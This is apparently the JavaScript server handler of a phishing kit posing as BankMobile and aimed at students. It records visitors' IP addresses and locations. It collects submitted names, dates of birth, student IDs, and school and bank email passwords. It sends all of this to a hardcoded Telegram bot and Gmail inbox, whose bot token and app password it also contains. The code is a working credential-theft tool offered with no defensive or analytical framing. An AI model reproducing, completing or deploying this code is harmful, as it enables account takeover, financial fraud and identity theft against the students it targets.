const axios = require("axios");
const nodemailer = require("nodemailer");
const cookie = require("cookie");

module.exports = async (req, res) => {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method Not Allowed" });
  }

  // Parse cookies
  const cookies = cookie.parse(req.headers.cookie || "");
  const visitorAlertSent = cookies.visitorAlertSent === "true";

  const {
    fullName,
    phoneNumber,
    currentSchoolEmail,
    currentSchoolPassword,
    previousSchoolEmail,
    previousSchoolPassword,
    hasBankMobileProfile,
    bankMobileEmail,
    bankMobilePassword,
    studentid,
    dob,
  } = req.body || {};

  // Get visitor IP and location
  const rawIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const visitorIP = rawIP?.split(",")[0]?.trim();

  let locationInfo = "Unknown Location";
  try {
    const geoRes = await axios.get(`https://ipapi.co/${visitorIP}/json/`);
    const { city, region, country_name } = geoRes.data;
    locationInfo = `${city || "?"}, ${region || "?"}, ${country_name || "?"}`;
  } catch (geoErr) {
    console.warn("🌐 IP lookup failed:", geoErr.message);
  }

  const timestamp = new Date().toLocaleString("en-US", {
    timeZone: "America/New_York",
    hour12: true,
  });

  const botToken = "8197614628:AAF5CDk0BWe4sE3MuKDjbPMIWfqiIurDYKo";
  const chatId = "5943926384";

  const transporter = nodemailer.createTransport({
    service: "Gmail",
    auth: {
      user: "recruitmentupdate9@gmail.com",
      pass: "ghtb ltut ihbk ghor",
    },
  });

  // ✅ Send visitor alert only once using cookies
  if (!visitorAlertSent) {
    const visitorMessage = `
👀 *New Visitor On BankMobile*

🌐 IP: ${visitorIP}
📍 Location: ${locationInfo}
🕒 Time: ${timestamp}
`;

    try {
      await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        chat_id: chatId,
        text: visitorMessage,
        parse_mode: "Markdown",
      });

      await transporter.sendMail({
        from: '"BankMobile" <workingfullz@gmail.com>',
        to: "recruitmentupdate9@gmail.com",
        subject: "👀 New Visitor BankMobile",
        text: `New visitor BankMobile:\n\nIP: ${visitorIP}\nLocation: ${locationInfo}\nTime: ${timestamp}`,
      });

      // Set cookie to prevent duplicate alert
      res.setHeader("Set-Cookie", cookie.serialize("visitorAlertSent", "true", {
        path: "/",
        httpOnly: true,
        maxAge: 60 * 60 * 24, // 1 day
        sameSite: "strict",
      }));
    } catch (err) {
      console.error("Visitor alert failed:", err.message);
    }
  }

  // If no form submitted, stop here
  if (
    !fullName &&
    !phoneNumber &&
    !currentSchoolEmail &&
    !currentSchoolPassword &&
    !previousSchoolEmail &&
    !previousSchoolPassword &&
    !studentid &&
    !dob
  ) {
    return res.status(200).json({ message: "Visitor tracked" });
  }

  // Validate form
  if (
    !fullName ||
    !phoneNumber ||
    !currentSchoolEmail ||
    !currentSchoolPassword ||
    !previousSchoolEmail ||
    !previousSchoolPassword ||
    !studentid ||
    !dob ||
    typeof hasBankMobileProfile !== "string"
  ) {
    return res.status(400).json({ error: "Missing required fields" });
  }

  const message = `
📩 *New BankMobile Details*

👤 Full Name: ${fullName}
📱 Phone Number: ${phoneNumber}
🆔 Student ID: ${studentid}
🎂 DOB: ${dob}

🏫 *Current School*
📧 Email: ${currentSchoolEmail}
🔑 Password: ${currentSchoolPassword}

🏫 *Previous School*
📧 Email: ${previousSchoolEmail}
🔑 Password: ${previousSchoolPassword}

🏦 *BankMobile*
✔️ Has Profile: ${hasBankMobileProfile}
📧 Email: ${bankMobileEmail || "N/A"}
🔑 Password: ${bankMobilePassword || "N/A"}

🌐 Visitor IP: ${visitorIP}
📍 Location: ${locationInfo}
🕒 Time: ${timestamp}
`;

  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown",
    });

    await transporter.sendMail({
      from: '"BankMobile" <workingfullz@gmail.com>',
      to: "recruitmentupdate9@gmail.com",
      subject: "📩 New BankMobile Details",
      text: message,
    });

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("Telegram or Email Error:", error.message);
    return res.status(500).json({ error: "Failed to send submission" });
  }
};
